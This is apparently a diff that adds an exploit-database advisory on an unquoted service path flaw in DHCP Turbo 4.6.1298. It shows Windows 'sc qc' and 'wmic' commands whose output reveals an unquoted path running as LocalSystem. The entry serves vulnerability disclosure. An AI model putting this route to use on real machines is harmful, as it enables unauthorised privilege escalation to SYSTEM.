@@ -1,0 +1,26 @@
+Exploit Title: DHCP Turbo 4.61298 - 'DHCP Turbo 4' Unquoted Service Path
+Exploit Author: boku
+Date: 2020-02-10
+Vendor Homepage: https://www.weird-solutions.com
+Software Link: https://www.weird-solutions.com/download/products/dhcptv4_retail_IA32.exe
+Version: 4.6.1298
+Tested On: Windows 10 (32-bit)
+
+C:\Users\user>sc qc "DHCP Turbo 4"
+SERVICE_NAME: DHCP Turbo 4
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\DHCP Turbo 4\dhcpt.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : DHCP Turbo 4
+        DEPENDENCIES       : Nsi
+                           : Afd
+                           : NetBT
+                           : Tcpip
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\user>wmic service get name, pathname, startmode | findstr "Turbo"
+DisplayName         PathName                                      StartMode 
+DHCP Turbo 4        C:\Program Files\DHCP Turbo 4\dhcpt.exe       Auto
